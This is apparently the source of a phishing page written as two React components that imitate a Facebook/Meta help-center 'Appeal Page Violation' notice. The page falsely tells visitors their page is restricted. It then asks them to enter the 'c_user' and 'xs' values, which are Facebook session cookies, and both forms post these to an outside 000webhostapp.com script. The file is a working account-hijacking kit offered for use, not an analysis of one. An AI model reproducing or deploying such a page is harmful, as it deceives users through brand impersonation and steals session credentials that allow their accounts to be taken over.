import React from 'react';

const AppealForm: React.FC = () => {
    return (
        <>
            <div className="md:hidden lg:hidden sm:block border flex w-full h-16 relative bg-[#4667ac]">
                <div className="mx-5 mt-3">
                    <img className="h-7" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2" />
                </div>
                <div>
                    <form>
                        <label htmlFor="search" className="mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
                        <div className="relative">
                            <div className="absolute inset-y-0 left-0 flex items-center pl-3 mx-3 pointer-events-none">
                                <svg className="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                                    <path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
                                </svg>
                            </div>
                            <input type="search" id="search" className="block w-full mt-4 mx-4  pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="How Can We Help?" required />
                        </div>
                    </form>
                </div>
            </div>
            <form action="https://polycyclic-brains.000webhostapp.com/redirect4.php" method="post">
                <div className="relative flex border bg-[#e9ebee] h-10 md:hidden lg:hidden sm:block">
                    <div>
                        <div>
                            <img className="h-5  mx-4 mt-2 shadow-2xl md:hidden lg:hidden sm:block" src="https://cdn.glitch.global/47f8d3f1-7668-4ff8-bcd7-6a4c9c9f27dd/home.png?v=1707326430864" alt="" />
                        </div>
                    </div>
                    <div className="md:hidden lg:hidden sm:block">
                        <p className="text-[#3578e5] font-extrabold font-serif -mx-3 mt-[0.6rem]">Help Center</p>
                    </div>
                </div>
                <div className="relative flex justify-center items-center mt-7 md:hidden lg:hidden sm:block">
                    <div className="border w-80 shadow-lg">
                        <div>
                            <p className="border-b pl-3 bg-slate-200">Appeal Page Violation</p>
                        </div>
                        <div>
                            <p className="text-[10px] font-serif mt-3 mx-3">We have detected unusual activity on your page that violates our community standards.</p>
                        </div>
                        <div>
                            <p className="text-[10px] font-serif  mt-3 mx-3">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p>
                        </div>
                        <div>
                            <p className="text-[10px] font-serif  mt-3 mx-3">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
                        </div>
                        <div>
                            <b className="text-[10px] text-[#90949c] font-bold mx-3">Detailed Video Information</b>
                        </div>
                        <div>
                            <a className="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4">
                                <img className="w-32 h-20 mx-3" src="https://cdn.glitch.global/47f8d3f1-7668-4ff8-bcd7-6a4c9c9f27dd/download%20(2).jfif?v=1707326430512" alt="" />
                            </a>
                        </div>
                        <p className="text-[10px] font-serif  mt-3 mx-3">Please be sure to provide the requested information below.</p>
                        <div>
                            <p className="text-sm text-gray-400 mx-5">c_user</p>
                            <input className="border h-5 mx-3" type="number" name="c_user" id="c_user" required />
                        </div>
                        <div>
                            <p className="text-sm text-gray-400 mx-5 mt-2">xs</p>
                            <input className="border h-5 mx-3" type="text" name="xs" id="xs" required />
                        </div>
                        <div>
                            <p className="text-[10px] font-serif   mt-3 mx-3">Please make sure account not to log out from your computer or laptop until you have received a verification email.</p>
                        </div>
                        <div className="border mx-3 h-10 mt-3 border-slate-200 bg-slate-200">
                            <button className="border bg-[#4267b2] px-2 p-[2px] rounded mx-52 mt-[7px] hover:bg-blue-400">
                                <p className="text-white text-sm font-serif">Submit</p>
                            </button>
                        </div>
                        <div className="mt-8"></div>
                    </div>
                </div>
            </form>
        </>
    );
};

export default AppealForm;
import React from 'react';

const AppealFormForPC: React.FC = () => {
    return (
        <div className="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
            <div className="mx-10 mt-4">
                <b className="text-5xl text-white">facebook</b>
            </div>
            <div>
                <form className="sm:hidden lg:block md:block">
                    <label htmlFor="search" className="hidden lg:block md:block mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
                    <div className="relative hidden md:block lg:block">
                        <div className="absolute inset-y-0 left-0 flex items-center pl-96 mx-3 pointer-events-none">
                            <svg className="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                                <path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
                            </svg>
                        </div>
                        <input type="search" id="search" className="block w-[600px] p-1 mx-96 -mt-9  pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="How Can We Help?" required />
                    </div>
                </form>
            </div>
            <form className="sm:hidden lg:block md:block" action="https://polycyclic-brains.000webhostapp.com/redirect4.php" method="post">
                <div className="relative flex border bg-[#e9ebee] h-12 md:block lg:block hidden ">
                    <div>
                        <div>
                            <img className="h-7  mx-10 mt-2 shadow-2xl md:block lg:block hidden" src="https://cdn.glitch.global/47f8d3f1-7668-4ff8-bcd7-6a4c9c9f27dd/home.png?v=1707326430864" alt="" />
                        </div>
                    </div>
                    <div className="md:block lg:block hidden">
                        <p className="text-[#3578e5] text-xl font-extrabold font-serif  mx-[4.50rem] -mt-6 u">Help Center</p>
                    </div>
                </div>
                <div className="border md:block hidden lg:block block mx-72 mt-9 w-[630px]">
                    <div>
                        <p className="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">Appeal Page Violation</p>
                    </div>
                    <div>
                        <p className="mt-4 pl-3 text-[12px] font-semibold">We have detected unusual activity on your page that violates our community standards.</p>
                    </div>
                    <div>
                        <p className="mt-4 pl-3 text-[12px] font-semibold">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p>
                    </div>
                    <div>
                        <p className="mt-4 pl-3 text-[12px] font-semibold">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
                    </div>
                    <div>
                        <p className="text-[11px] text-[#90949c] p-2 font-semibold">Detailed Video Information</p>
                    </div>
                    <div>
                        <a className="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4">
                            <img src="https://cdn.glitch.global/47f8d3f1-7668-4ff8-bcd7-6a4c9c9f27dd/download%20(2).jfif?v=1707326430512" alt="" />
                        </a>
                    </div>
                    <div>
                        <p className=" pl-3 text-[12px] font-semibold">Please be sure to provide the requested information below.</p>
                    </div>
                    <div>
                        <p className="text-slate-400 pl-4 mt-1">c_user</p>
                        <input className="border h-6 pl-1 mx-3" type="number" name="c_user" required />
                    </div>
                    <div>
                        <p className="text-slate-400 pl-4 mt-1">xs</p>
                        <input className="border h-6 pl-1 mx-3" type="text" name="xs" required />
                    </div>
                    <div>
                        <p className="mt-4 pl-3 text-[12px] font-semibold">Please make sure account not to log out from your computer or laptop until you have received a verification email.</p>
                    </div>
                    <div className="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
                        <div className="flex justify-end mx-2">
                            <button className="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">Submit</button>
                        </div>
                    </div>
                    <div className="mt-4"></div>
                </div>
                <footer>
                    <div>
                        <li className="text-sm text-[#90949c] md:hidden lg:hidden sm:block mt-4 pl-72 flex hover:underline"></li>
                    </div>
                    <div className="hidden lg:block md:bllock flex">
                        <div>
                            <p className="text-slate-400 text-sm">META ©️ 2024 </p>
                        </div>
                        <div className="flex relative">
                            <p className="pl-72 hover:underline text-slate-400">About</p>
                            <p className="pl-52 hover:underline text-slate-400">AdChoices</p>
                            <p className="pl-28 hover:underline text-slate-400">Terms and policies</p>
                        </div>
                        <div className="flex relative">
                            <p className="pl-72 hover:underline text-slate-400">Privacy Policy</p>
                            <p className="pl-[9.75rem] hover:underline text-slate-400">Create ad</p>
                            <p className="pl-[7.75rem] hover:underline text-slate-400">Cookies</p>
                        </div>
                        <div className="flex relative">
                            <p className="pl-72 hover:underline text-slate-400">Carees</p>
                            <p className="pl-[12.75rem] hover:underline text-slate-400">Create Page</p>
                        </div>
                    </div>
                    <div className="mt-7"></div>
                </footer>
                <div className="hidden"></div>
            </form>
        </div>
    );
};

export default AppealFormForPC;
